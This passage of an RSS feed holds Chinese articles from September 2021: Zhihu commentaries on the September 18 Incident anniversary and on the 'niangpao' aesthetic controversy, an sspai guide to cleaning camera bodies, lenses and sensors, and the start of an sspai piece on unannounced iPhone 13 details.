data-private-watermark-src=\"v2-bef250271bf9cad50a89ff0fb1086020\"></p>\n<p>在农村，日本人控制着土地，大肆收缴“出荷粮”，即中国农民的余粮一律上缴。广大农民无粮糊口，以野菜、糠秕充饥，吃得浑身浮肿，卧榻难起。不仅如此，日本侵略者还强迫农民上缴棉花。棉花棉布被征作军用，老百姓只能穿用破棉絮、废旧棉花、破衣服等破烂纤维织成的粗布。很多贫苦百姓夏无单、冬无棉，无房者住炮台、小窝棚，冻死饿死者屡见不鲜。</p>\n<p>彼时，日伪还强制推行“集团部落”政策，这是日本侵华战争中的又一暴行。日军为了应付东北抗日联军，断绝他们的后勤补给，将抗联根据地与村民隔绝开，设计出“集团部落”，强制将中国村民迁移至其中，定量供给村民粮食，并设置严密的封锁线。很多“集团部落”内的中国百姓因此饿死，抗日联军也由于缺乏粮草供给被迫突围，很多部队作战失利。受“集团部落”政策的影响，东北各地数十万居民背井离乡，成为流落他乡的东北难民。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac16fc140ec864b156a1c0d318536ecc_720w.jpg?rss\" data-caption=\"天津东局子收容东北难民的难民营\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"374\" data-watermark=\"original\" data-original-src=\"v2-ac16fc140ec864b156a1c0d318536ecc\" data-watermark-src=\"v2-e9bccc4058058e6cbb14429da2653e7b\" data-private-watermark-src=\"v2-c000aff4b13947818c58703bee0cfca1\"></p>\n<p>那时候有句民谣:“日本鬼子是恶狼，抓劳工要出荷粮，老百姓遭了殃，穿的是更生布，吃的是糟糠，好像没爹娘。”</p>\n<p><b>然而并非是没有爹娘，只是母亲的力量太过孱弱，根本无法庇佑自己的人民。</b>孩子受苦，母亲何尝不是在受难？她们只能眼睁睁地看着孩子饱受身体与精神的双重摧残。侵略者不仅是要夺走她的孩子，甚至妄想让孩子们“认贼作父”。</p>\n<p>为配合军事统治达到其长期霸占东北的目的，日本在东北实行一系列殖民思想统治和奴化教育措施，企图使青少年潜移默化地崇尚日本精神、泯灭中华民族意识，成为给日本侵华效力卖命的汉奸走狗和为其掠夺中国资源效力的劳动力。这一时期，中小学的学生每天早上须向新京（长春）作“满洲帝宫遥拜”，再向日本东京方向作“日本天皇陛下遥拜”，学生同时须以日语背诵皇帝诏书《国民训》。他们升旗时升的是日本国旗和满洲国旗，要用日语唱日本国歌，向东朝拜天皇。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-db64e8ec75b5ff1b20ec6593d2135846_720w.jpg?rss\" data-caption=\"伪满的虚假宣传\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"388\" data-watermark=\"original\" data-original-src=\"v2-db64e8ec75b5ff1b20ec6593d2135846\" data-watermark-src=\"v2-ae585ab1f9d784dcbba82b9dfeafbf67\" data-private-watermark-src=\"v2-d216034d626021ffc12f66083a765ee4\"></p>\n<p><b>何为亡国奴？就是即使身在自己的国土，也不过是他人的附庸，生死由人不由己，</b>是侵略者眼中永远的最底层，可以肆意凌辱，且无需付出任何代价。千万人曾沦为亡国奴，其中有人匍匐跪拜，有人闻风而逃，但有人不屈抗争，死也要站着死，用自己的生命与血性，来洗刷同胞的耻辱，来证明中国还有希望，让后人不再蒙受亡国之耻。<b>当胜利到来的那一天，历史终于写下了最后的答案：中国，始终有希望。</b></p>\n<p>铭记国耻，就是要牢记历史教训。九一八事变距今已过去整整90年，但历史深处发出的警示言犹在耳。我们牢记这段耻辱、伤痛的历史，就是要牢记落后就要挨打的教训，更要知耻而后勇，绝不允许历史的悲剧重演。<b>中国人的命运只能掌握在我们自己手中。</b></p>\n<p><b>我是苹苹，感谢您阅读我的观点。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e02f4b6ed3830aa4675b71122eb7c1fc_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"743\" data-rawheight=\"456\" data-watermark=\"original\" data-original-src=\"v2-e02f4b6ed3830aa4675b71122eb7c1fc\" data-watermark-src=\"v2-7f536761acb370b5d72ab9b1475a7bc2\" data-private-watermark-src=\"v2-29a0e555ac13c422515f610152403feb\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jun-zheng-ping-39?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">钧正平</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/486830339/answer/2127889662?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1974 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/470741239?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">「七七事变」84 周年纪念日，日本记者发推称：在日本很少有人提「 7 月 7 日」，反映了哪些问题？</a><br><a href=\"http://www.zhihu.com/question/487578931?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年九一八事变90周年纪念日，面对国耻纪念日，你有什么想说的吗？</a><br>\n","link":"http://www.zhihu.com/question/486830339/answer/2127889662?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"「九一八」事变 90 周年纪念日恰逢 2021 年全民国防教育日，勿忘国耻，警钟长鸣，你有什么想说的？","date":"2021-09-18 10:35:14","description":"\n<p>一年三百六十日，多是横戈马上行。作为军人，只有两种状态：打仗和准备打仗。战场打不赢，一切等于零。所以，练兵备战，练强打赢本领，是最好的国防教育。</p>\n<p>今天，是“九一八事变”90周年。90年前的惨痛一幕，中国人民经历的14年抗战的艰辛历程，无不警醒我们：落后就要挨打，没有强大的军队，没有强大的国防，就没有和平幸福的生活。所以，回望历史，我们的心中要勿忘国耻，警钟常鸣，自强不息，强国强军。身为军人，就是要做到：脑子里永远有任务！眼睛里永远有敌人，肩膀上永远有责任，胸膛里永远有激情！在强军兴军的征程上，努力学习、刻苦训练，不断提升打赢本领，用青春和热血保护好我们的国家，绝不让历史悲剧重演！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/dong-bu-zhan-qu-49?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">东部战区</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/486830339/answer/2127751332?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1974 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/470741239?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">「七七事变」84 周年纪念日，日本记者发推称：在日本很少有人提「 7 月 7 日」，反映了哪些问题？</a><br><a href=\"http://www.zhihu.com/question/487578931?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021年九一八事变90周年纪念日，面对国耻纪念日，你有什么想说的吗？</a><br>\n","link":"http://www.zhihu.com/question/486830339/answer/2127751332?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"旅行拍照虽然开心，但别忘了清洁相机","date":"2021-09-18 08:58:52","description":"\n<p>随着中秋和国庆的双节到来，不少朋友一定准备好了带上相机出门旅行。一圈游山玩水之后，除了要记得导出和备份照片，另一件一定要留意的事就是相机的清洁。在这篇文章中，我就带你看看如何从外到内清洁相机，减少灰尘和污渍给相机带来的损伤和隐患。</p>\n<p><strong>注：</strong>本文部分信息来自作者 <a class=\"ss-atUser\" data-mention=\"@甜食\" user-id=\"bs2pbalb34tcs0pncbe0\" href=\"https://sspai.com/u/zcz2be6v\">@甜食</a> </p>\n<h2>基础准备</h2>\n<p>想要完整地清洁相机，下面这些东西需要你提前购买：</p>\n<ul>\n<li>皮吹</li>\n<li>柔毛刷</li>\n<li>镜头清洁布（或镜头纸）及清洁液，或者镜头专用湿巾</li>\n<li>传感器清洁棒</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/00bc31345c632f9795a7bf7f71e1b60d.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/2cf627c38c82f27d84846580cce4d9a0.jpg\"><figcaption>皮吹和镜头湿巾是最万能的清洁装备，可以随身携带</figcaption></figure><p>市面上此类产品已经非常丰富且成熟，购买时留意选择自己熟悉或有耳闻的大品牌即可，注意不要贪图便宜，尽管皮吹、毛刷之类的产品没什么技术难度，但做工和用材还是会影响使用体验。部分厂牌会提供以上清洁工具的套装，一套质量过关的产品的价格应该在百元以上。虽然不是绝对地「贵就是好」，但基数不能太低。</p>\n<p>下文中，我就分别阐述它们的用途和用法。在开始之前，你只需要记住相机清洁的整体顺序是「先吹后擦」，即先吹掉机身或镜头上的浮灰，然后再进行擦拭等工作，这样做的好处是可以防止直接擦拭导致灰尘磨损镜头或关键部位，也能避免清洁布越擦越脏的麻烦。</p>\n<h2>机身清洁</h2>\n<p>相机的机身部分日常暴露在外，很容易沾染各种油污、灰尘、毛发等。不过，和擦手机屏幕一样，清洁相机机身非常简单，也没什么难度。</p>\n<p>最实用的清洁工具是皮吹。相机有许多缝隙容易积灰，镜头卡口周围往往是积灰最严重的区域，使用皮吹可以将灰尘吹走。大部分时候，用皮吹把机身吹一遍就足以保持相机清洁。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/98b5d404bbf953bc9f1cc1f60b6c8c15\"></figure><p>如果机身上有相对顽固的积灰，或者机器本身久未清理，可以使用柔软的毛刷将灰尘刷掉。只要不是将毛刷直接对准取景器、镜头、液晶屏等相对脆弱的部分，其它位置都可以随意清理。</p>\n<p>此外，机身也可以用清洁布搭配屏幕清洁液擦拭，以去除油污等。需要注意的是，要谨慎使用酒精擦拭相机机身，因为许多相机都会在机身上使用皮革材料，酒精则会直接损坏皮革。另外，清洁液尽可能不要直接喷到机身上，而是先喷到清洁布上再擦拭，避免液体透过缝隙渗入机内。</p>\n<h2>镜头清洁</h2>\n<p>镜头通常是一部相机最贵的「配件」，需要善加保护。大体来说，清理镜头和机身的区别不大，重点在于避免清理过程中产生刮擦。</p>\n<p>清理镜头的主要工具依然是皮吹，大部分时候，皮吹都能有效吹走镜头周边的浮灰。如果灰渍相对顽固，可以使用镜头专用清洁布，或者近几年很流行的镜头清洁湿巾。在购买此类产品时需要留意产品说明里是否明确指出「可以擦拭相机镜头」，避免损坏镜头镀膜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/e2c43170c3924d89dc41ab937fda2121.jpg\"><figcaption>使用擦镜纸时可以从中心到外围旋转擦拭</figcaption></figure><p>市面上近年来还流行一种镜头笔，这种笔通常一头是毛刷，另一头是一个类似吸盘的碳头。这个碳头的作用和清洁布类似，主要用于去除镜面上的污渍。如果你已经分别有了毛刷和清洁布，不买镜头笔也可以，不用跟风或着被厂商忽悠。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/76dcb794ec7b4f6294b4f00dcb1dfec7\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/a43b5215980d3173af8ae128cc3e47bb.jpg\"><figcaption>相机清洁笔的两端</figcaption></figure><p>镜头滤镜的清洁方法也与镜头类似，此处不再赘述。</p>\n<h2>传感器清洁</h2>\n<p>传感器清洁是相机清洁里理论上难度更高的部分。尽管如今的相机做工越来越好，防水防尘性能也越来越普及，但在各种使用环境中，传感器中依然难免落入灰尘。而传感器恰恰又是相机里最金贵的组件，清理起来不仅要小心谨慎，还需要使用正确的工具。</p>\n<h3>初步排查：如何简单地检查传感器是否脏污？</h3>\n<p>传感器落灰通常是靠肉眼无法分辨的，换言之，就算把镜头拆下来对着传感器看半天也很难确定它是否真的脏了。更快捷简单的方式是面向天空，将光圈调至 f11 以下（或者最小），对焦点调至无限远，对着天空拍照。之后查看照片，看看片中是否有明显的小黑点，如果有就说明传感器脏了，需要清理。反之则说明传感器的清洁状态不错，可以酌情省略进行下面的步骤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/e46d90bd10a85a202419d6b5cbf800f9.JPG\"><figcaption>画面中心上方的黑点全是传感器污渍</figcaption></figure><h3>进阶排查：更严谨的排查过程</h3>\n<p>确定传感器脏污需要清理后，接下来需要更严谨地确定传感器的脏污情况。</p>\n<p>找一张白纸、一面白墙，或者用电脑显示器全屏开启一张纯白图片。将相机的光圈调至 f11 以下（或者最小），对焦点调至无限远，ISO 调整至 200，对着纯白画面拍照。然后将照片导入电脑上的 Adobe Lightroom 进行检查，画面中黑点的位置就是传感器上污点之所在。黑点越多，说明传感器越脏。</p>\n<p>为了让污点的位置展示得更清楚，你还可以使用 Lightroom 的「显示污点」（Visualize spot）功能，操作方法为：在 Lightroom 中选择污点工具，找到「显示污点」按钮并点击。此时，画面会变成黑白色，纯白背景下的脏点都会凸显出来。</p>\n<p>部分相机还自带灰尘检测功能，在对着白色背景拍照后，相机会自动生成一张脏点的位置图，相当于在机内自动完成了上述导入电脑的过程。如果你的相机有该功能可以善加利用，能省去不少转存和处理图片的时间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/056dfd271dcf87bf2a11614cd4cf9a2b\"><figcaption>相机自带的灰尘检测功能，其实就是将手动检查的过程在机内自动化完成了</figcaption></figure><p>以上步骤只是为了确认传感器的脏污程度，你不需要刻意记住污点的位置，因为在接下来的清理步骤中，无论传感器的脏污程度如何、脏点如何分布，我们都将采取无差别清理的模式。</p>\n<h3>清理传感器</h3>\n<p>清洁相机传感器需要使用上文提到的相机传感器清洁棒，搜索相关关键词即可在电商平台买到。对于市面上常见的相机画幅，如中画幅、全画幅、APS-C、M 4/3 等，基本都有对应尺寸的清洁棒产品，购买时要根据自己的相机选择，不要买错。我也搜索过一些比较冷门的画幅（譬如 APS-H），匹配度就差了好多，如果你在用此类画幅的相机，可以购买小于相机画幅尺寸的清洁棒，然后在清洁时多清几次。</p>\n<p>相机清洁棒的一端是一个类似铲子形状的清洁头，上面包裹着传感器清洁布，通常还会附带一瓶配套的清洁液。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/40f70ee84920fe51542a30e469279dbf.jpg\"><figcaption>传感器清洁棒</figcaption></figure><p>清洁传感器的过程为：</p>\n<ol>\n<li>使用皮吹等工具清理一下相机外部，尤其是镜头卡口附近的灰尘，避免灰尘落入传感器，造成二次污染。</li>\n<li>打开相机电源，在设置菜单中找到「清洁模式」，开启。如果你使用的是单反相机，相机在清洁模式下通常会自动升起反光板，露出传感器。如果你的相机具备机械防抖功能，清洁模式也会将防抖关闭并将传感器位置固定，避免清洁时发生抖动。无反相机在该模式下则会打开快门帘，同样会露出传感器。</li>\n<li>传感器朝向桌面或下方，用皮吹清理一下，同样防止浮灰掉落。</li>\n<li>放下相机。拆开一个相机清洁棒，根据说明书上的提示几滴清洁液到清洁布上（通常都是 1 至 3 滴），等待几秒钟，让清洁液充分浸湿清洁布。</li>\n<li>用清洁棒的一面从左向右轻轻刷过传感器，再用另一面反向刷回。如果你的传感器比较脏，就拆一条新的清洁棒再重复一次以上动作。</li>\n<li>将镜头卡回卡扣，清洁结束。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/9fd02d780914268080cd35189dc413fc.gif\"><figcaption>清洁棒的使用方法，这个片子拍得很直观，我就不自己拍了。动图截取自 Leica Camera</figcaption></figure><p>清洁完毕后，你需要重复上文提到的排查过程，再次检查传感器是否还有污渍，如果没有清理干净，就重复以上步骤，直到传感器完全没有灰尘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/c0ef6b789d45340bb80c180268894948\"><figcaption>清理完成后，画面干净无尘</figcaption></figure><h3>补充内容：如何修复照片里的污点</h3>\n<p>很多时候，你并未注意到传感器上有了污点，但照片已经拍了。等出游一圈回到家时，才发现照片里有黑色的脏点，不禁一一边后悔自己当初没有先清理相机再拍照，一边发愁已经拍好的照片怎么办。</p>\n<p>假如真的发生了这样的情况也别担心，大部分图片后期处理工具都已经具备了比较完善的污点修复功能，可以帮你挽回损失。我继续以 Adobe Lightroom 为例，演示一下去处污点的过程。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/d034a9af9e9559991e053a909dfc90cb.jpg\"></figure><ul>\n<li>进入 Lr，打开一张照片，进入编辑模式，选择污点修复工具（Healing Brush）。</li>\n<li>修复模式里选择修复（Heal），此时你的鼠标指针会变成圆圈，点击图片，相应位置里的污点就会被自动去除。</li>\n<li>点击「显示污点」按钮，图片会反白，污点会以白点的形式出现在画面里。</li>\n<li>除了污渍之外，天空中的鸟和某些画面元素也有可能显示为白点，所以要结合原画面进行去除。另外，你还可以调节阈值（Threshold）的滑动条，以增加或减少显示污点的强度，进而灵活判断哪些是污点，哪些是需要保留的细节。</li>\n</ul>\n<p>还有一点：建筑或画面主体里的污点通常不必去除，因为他们在实际画面里基本看不到，强行去除反而可能造成对应局部看上去怪怪的。有些污点只有在「显示污点」模式下才能看到，是否去除也由你酌情判断。</p>\n<p>到这里，一张照片的去污工作就结束了。但如果你出游一次拍了上千张照片，然后一张一张修复也很费力。好在同一时段拍摄的照片污点位置通常都是一样的，所以可以利用 Lr 的照片批处理功能，批量修复污点，具体的操作办法为：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/3216039215494ee216573663d0e16dbe.png\"></figure><ul>\n<li>一张照片去污完毕后，在工具栏中选择「选择拷贝设置（Choose Edit Settings to Copy）」。</li>\n<li>先清空所有已勾选的设定，然后单独勾选「修复」。接下来，你就可以将该设定粘贴在所有需要修复的图片中了。</li>\n</ul>\n<p>还有一点要注意：尽管这样批处理省时省力，但不是每张照片的固定位置都需要修复污点，如上文所言，照片里有内容的部分通常是不用修复的，所以批处理之后还要记得再梳理一遍，检查纰漏。</p>\n<p>如果你在用 Capture One，去污过程略有不同，但整体思路类似，具体过程为：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/623db2ff9c700b1652c357ecb6dfeadf.jpg\"></figure><ul>\n<li>打开 C1，载入照片，选择曝光（Exposure）编辑介面。</li>\n<li>新建一个填充图层（Filled Layer）。</li>\n<li>在色阶（Levels）调节面板中，将高光和阴影部分的底部拨杆调至中心，这一步的目的是提高画面对比度，让高光部分的污点显现出来。</li>\n<li>选择原始图层，开启污点清除工具，清理画面中的污点。</li>\n<li>清理完毕后关闭填充图层，画面颜色恢复，污点也被清理干净了。更详细的演示步骤可以参考 <a href=\"https://www.youtube.com/watch?v=E3f6He4eens&amp;t=321s\" target=\"_blank\">这个影片</a>。</li>\n</ul>\n<h2>最后的提醒</h2>\n<p>在清洁相机时，最需要注意的就是不要使用压缩空气来吹灰，务必使用皮吹。压缩空气的问题在于：其一，如果瓶内压力过高、温度过低，喷出的冷气会将空气里的水凝结并喷到机身部件上，造成额外的清理负担；其二，过冷的空气本身也有可能造成传感器冻裂，损坏相机。我就曾非常鲁莽地用压缩空气吹过传感器，结果把一坨冰渣吹到了徕卡的传感器上，心疼指数不难想象。你在上文看到的传感器上的麻点点灰尘就是乱用压缩空气留下的后遗症。</p>\n<p>此外，如果你在使用胶卷相机，则需留意某些机械部件的老化和腐蚀，譬如相机背盖的遮光棉老化后会掉渣，需要及时更换。部分老相机还会出现镜头发霉、黄斑虚焦等问题，可以找专业的相机维修站解决。</p>\n<p>好啦，以上就是关于相机清洁的整体内容。希望你能在假期里玩得尽兴，拍出大片。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68863"},{"title":"北京广电局要求杜绝「娘炮」审美取向，如何定义「娘炮」审美？或将带来哪些影响？","date":"2021-09-18 08:45:44","description":"\n<p>近期，整治娱乐圈乱象受到公众高度关注，“娘炮形象”一词也引起网络热议。<b>其实，我们反对“娘炮形象”，反对的不是多样化的审美文化，不是高效的市场机制，更不是平等的性别秩序，而是反对资本裹挟下的不良文化审美现象和发展趋势。</b></p>\n<p>不可否认，近年来，借助资本运作和商业包装，在影视剧和综艺节目中频频出现一些“娘炮形象”。他们“故意打造人设”，造型“浮夸”，举手投足间宣扬“个性”，一时间成为了所谓的“风尚”而侵染了社会审美和大众视野，甚至对青少年审美趋向产生了不良影响。</p>\n<p><b>在最浅层面，“娘炮”是一种语言现象，</b>它由表示“少女”和“母亲”的词根“娘”，和表示“有经验”的词缀“炮儿”（老炮儿、职场炮儿）构成，在字面上表示在女性行为和气质上很有经验的人。有人考证，该词较早的公众亮相是在某些青春偶像剧中，女主骂男主“娘炮”。当然，在“阳刚”之外，男性审美和男性气质是多样的。但必须看到，<b>“娘炮形象”虽和阴柔的男性审美有关，其实却有着根本不同，是一个利用了阴柔、经过媒体美化的产业现象。</b></p>\n<p>内地娱乐尤其是偶像行业，在引进日韩偶像工业模式基础上，已经发展成了今天“全民制作人+练习生成团出道”的模式，进而全面“发扬光大”的道路。这就有了今天内地娱乐偶像工业年复一年生产出的一茬又一茬的有着高度同质化和套路化形象的偶像产品。由此，<b>资本打造“娘炮形象”的问题也呈现愈演愈烈之势。</b></p>\n<p>事实证明，行业的发展是期待“不同”的。如今，在女性审美领域，千篇一律的“白幼瘦”和“网红脸”已经反噬行业自身，审美疲劳的民众开始追求更加有辨识度的形象。因而，从行业健康角度来看，恰恰需要的是有魅力的审美和人格、有差异的产品和品牌。另一方面，偶像自身亦苦“娘”久矣。为了维持行业灌输给他们的那种单一的、所谓的“受欢迎”形象，他们不得不时刻节食、随时精致，甚至不惜削骨整容，在已经很“卷”的审美赛道上努力应对同行间的激烈竞争，还必须认清现实，面对隔年就被下一茬偶像替代的危机和命运。而更为重要的是，被如此精神文化食粮“投喂”的民众也鲜明地表达了自己的意愿：演技在线的老戏骨再次成为香饽饽，甚至于“四大天王”时代的怀旧照片被网友翻出来，复古风又开始流行。</p>\n<p>但是行业的困境、从业者的苦楚、民众的不满都难以改变资本的行为。在没有外力介入的情况下，资本在这条已经要被“耗”尽的审美道路上，究竟要再奔多久，我们很难判断。文化产品是一种特殊商品，当有着逐利性和滞后性，并已被资本左右的市场无法做出有效调节时，宏观调控就显得尤为重要。今天，市场在文艺创作生产的配置中起到的作用愈发重要，文艺从业者在自律的同时，更好发挥政府的调控功能、行业自身的引导和自律功能，对不良现象和行为进行及时纠偏，是当前应该迫切解决的课题。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wen-yi-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国文艺网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/487630781/answer/2127678196?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">810 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/484582339?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何界定一个艺人是否是娘炮?</a><br><a href=\"http://www.zhihu.com/question/299485947?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么现在国家审美越来越娘炮化了？</a><br>\n","link":"http://www.zhihu.com/question/487630781/answer/2127678196?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"iPhone 13 发布会上，Apple 没有告诉你的那些事","date":"2021-09-18 03:00:00","description":"\n<p>9 月 15 日凌晨，Apple 正式举行发布会，发布 iPhone 13 系列、Apple Watch Series 7、iPad mini 等多款新品。其中，iPhone 13 Pro 系列正式支持 ProMotion 高刷新率屏幕，推出远峰蓝新配色；iPad mini 更换 USB-C 接口，采用全面屏设计，支持二代 Apple Pencil 等。</p>\n<p>除了发布会上介绍的诸多特性，几款新设备还有许多发布会上没提、同样值得关注的有趣细节，少数派为你整理了其中部分有意思的内容，一起来看看。</p>\n<h2>iPhone 13 Pro 系列的摄像头变「大」了</h2>\n<p>不管是这次发布会还是 Apple 官网都没有提及 iPhone 13 Pro 系列的摄像头模组变得更大了，但是我们可以通过官网的机型对比图看出端倪。</p>\n<p>首先，可以确定的是 iPhone 13 Pro 和 iPhone 12 Pro 的高度与宽度是一样的，分别是 146.7 毫米和 71.5 毫米，在对比图中也可以得到佐证。接着，我画两条辅助线，就可以明显看到 iPhone 13 Pro 的摄像头区域比 iPhone 12 Pro 大了足足一圈。至于为何如此？大抵是为了放下更大底的摄像头感光元件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dn5b34tf23l9usug.png\"></figure><p>对于 iPhone 13 Pro Max 来说也是如此，只不过增加的幅度没有 iPhone 13 Pro 来得那么夸张，原因也很简单，这次 iPhone 13 Pro 和 iPhone 13 Pro Max 采用了完全一样的摄像头模组。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dndb34tf2q7dfis0.png\"></figure><p>国外有人在 Twitter 上发布了使用 iPhone 12 Pro 佩戴 iPhone 13 Pro 保护壳的照片，也能作为更加直观的对比：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/17/1f81d1218cab8c0d4f7bd7873a87d633.jpeg\"></figure><h2>iPhone 13 全系列变重</h2>\n<p>在去年 iPhone 12 系列完成一次瘦身后，今年的 iPhone 13 系列 4 款机型又胖回了一圈。iPhone 13 全系列 4 款机型全部比上一代更重，尤其是 iPhone 13 和 iPhone 13 Pro，分别比上一代重了 6.8% 和 8.6%。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dntb34tf23l9usv0.png\"></figure><h2>新机续航比「强」更强</h2>\n<p>iPhone 13 Pro 系列的续航的确比上一代有了十足的进步，甚至连 iPhone 13 Pro 都可以将上一代的 iPhone 续航王者 iPhone 12 Pro Max 比下去。根据官网的机型对比，可以发现 iPhone 13 Pro 的视频播放时间最长可达 22 小时，而 iPhone 12 Pro Max 的视频播放时间最长只有 20 小时； iPhone 13 Pro 的流媒体视频播放时间最长可达 20 小时，而 iPhone 12 Pro Max 的流媒体视频播放时间最长仅有 12 小时，差距明显。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dodb34tf2l9a5hk0.png\"></figure><h2>ProRes 视频格式在部分机型上被「阉割」</h2>\n<p>继去年 iPhone 12 Pro 系列上的 Apple ProRAW 格式后，今年的 iPhone 13 Pro 系列又增加了针对专业级视频拍摄的 ProRes 视频格式的支持。ProRes 格式有着高色彩保真度和低压缩度的特点，可以让我们在后期剪辑中尽可能地还原真实的色彩。</p>\n<p>不过，这次 ProRes 视频格式支持还是和去年一样针对机型进行了区别对待，iPhone 13 Pro 系列才支持这一功能，更甚的是库克的刀法还伸到了 128GB 最低容量的机型上，使用 ProRes 格式只能录制最高 1080P 30fps 规格的视频，而 256GB、512GB 和 1TB 的机型可以录制最高达 4K 30fps 规格的视频。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dntb34tf2l9a5hjg.png\"></figure><h2>电影效果模式只支持低帧率拍摄</h2>\n<p>发布会上演示的电影效果模式让很多人影像深刻，那种自然切换的浅景深效果令人着迷。暂且不论 iPhone 13 是否能取代专业的视频机，如果告诉你这个模式只支持拍摄 1080p 30 fps，可能会先浇灭你的一腔热血。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c524do5b34tf2q7dfisg.png\"></figure><h2>A15 芯片也分快慢</h2>\n<p>这次 iPhone 13 全系列和 iPad mini 6 都标配了 A15 仿生芯片，但是没有想到连同一块芯片都可以进行「阉割」。</p>\n<p>通过官网的机型对比图，我们可以看到 iPhone 13 Pro 系列上的 A15 仿生芯片拥有全新 5 核图形处理器，而 iPhone 13 上的 A15 仿生芯片的图形处理器是 4 核的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dolb34tf2l9a5hkg.png\"></figure><p>再来看 iPad mini 6 的官网介绍，看起来 A15 仿生芯片是和 iPhone 13 Pro 一样的满血版，这让 iPhone 13 和 iPhone 13 